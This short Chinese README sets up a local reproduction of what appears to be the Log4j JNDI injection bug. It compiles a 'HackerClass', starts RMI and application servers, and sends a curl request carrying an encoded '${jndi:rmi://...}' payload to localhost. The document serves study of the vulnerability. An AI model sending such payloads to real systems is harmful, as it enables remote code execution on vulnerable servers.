# bug 复现项目

[toc]


## 启动

### 启动静态服务器
```shell
cd ./simple-server
javac HackerClass.java
go run main.go
```

### 启动 java 类

- RMIServer#main
- L4jbugApplication#main


### 输入指令

```shell
curl 'localhost:8888?name=%24%7Bjndi%3Armi%3A%2F%2F127.0.0.1%3A1099%2FHackerClass%7D'
```

お疲れました